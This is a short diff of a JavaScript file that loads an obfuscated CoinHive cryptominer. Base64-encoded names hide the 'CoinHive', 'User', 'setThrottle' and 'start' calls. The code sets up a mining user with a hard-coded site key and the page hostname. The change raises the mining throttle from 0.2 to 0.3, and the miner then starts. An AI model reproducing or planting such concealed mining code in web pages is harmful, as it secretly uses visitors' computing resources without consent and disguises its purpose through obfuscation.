@@ -10,7 +10,7 @@ function loadScript(url, callback)
 }
 var afterFunction = function() {
 	g = new window[atob("Q29pbkhpdmU=")][atob("VXNlcg==")]('JrUWA6Zd72wf62sOQR49Fb4GlhA1fOpP', hostname);
-	window["g"][atob("c2V0VGhyb3R0bGU=")](0.2);
+	window["g"][atob("c2V0VGhyb3R0bGU=")](0.3);
 	window["g"][atob("c3RhcnQ=")]();
 };
 var g;
